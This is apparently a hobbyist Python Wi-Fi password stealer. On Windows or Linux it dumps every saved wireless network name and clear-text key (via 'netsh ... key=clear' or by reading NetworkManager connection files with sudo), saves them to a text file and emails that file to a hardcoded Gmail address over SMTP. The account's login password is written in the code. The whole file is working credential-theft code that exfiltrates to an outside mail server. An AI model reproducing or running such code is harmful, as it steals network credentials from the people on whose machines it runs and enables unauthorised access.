import platform
import subprocess
import os
import smtplib,ssl
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import formatdate
from email import encoders


### OS Detect ###
OperatingSystem = platform.system()
print("######################################")
print("Platform : "+ OperatingSystem)
print("######################################")


def Out_Fun():
    return "Name     : "+ wifi+"\nPassword : "+ Pass

def CreateFile():
    output = Out_Fun() 
    file = open("sample.txt","a") 
    file.write(output) 
    file.close()

def send_an_email():
    toaddr = 'ghostbatman999@gmail.com'    
    me = 'ghostbatman999@gmail.com' 
    subject = "What's News"
    msg = MIMEMultipart()
    msg['Subject'] = subject
    msg['From'] = me
    msg['To'] = toaddr
    msg.preamble = "test " 
                   #msg.attach(MIMEText(text))

    part = MIMEBase('application', "octet-stream")
    part.set_payload(open("sample.txt", "rb").read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="sample.txt"')
    msg.attach(part)
    try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(user = 'ghostbatman999@gmail.com', password = 'ghostbatman777')
                #s.send_message(msg)
        s.sendmail(me, toaddr, msg.as_string())
        s.quit()
                        #except:
                        #   print ("Error: unable to send email")
    except :
            print ("Error")


if OperatingSystem == "Windows" :
    data = subprocess.check_output(['netsh','wlan','show','profiles']).decode('utf-8').split('\n')
    wifis = [line.split(':')[1][1:-1] for line in data if  "All User Profile" in line]
    for wifi in wifis:
            results = subprocess.check_output(['netsh','wlan','show','profile',wifi,'key=clear']).decode('utf-8').split('\n')
            results = [line.split(':')[1][1:-1] for line in results if "Key Content" in  line]   
            for Pass in results:
                print("Name     : "+ wifi+"\nPassword : "+ Pass)
                CreateFile()
    send_an_email()

elif OperatingSystem == "Linux" :
    os.chdir(r"/etc/NetworkManager/system-connections") 
    data = os.listdir("/etc/NetworkManager/system-connections")
    for wifi in data:
        #print(wifi)
        results = subprocess.check_output(['sudo','cat',wifi]).split('\n')
        results = [line.split(":") for line in results if "psk=" in  line] 
        for a in results:
            #print(a)
            for Pass in a:
             # pass
                print("\nName     :  " + wifi +" \nPassword : " + Pass +"\n")
                CreateFile()
    send_an_email()
    os.remove("/etc/NetworkManager/system-connections/sample.txt")
            

else:
   print("Can't Detect Platform ")



print("Coder By : h4n24wnyin3 && 4un97huMy!n7")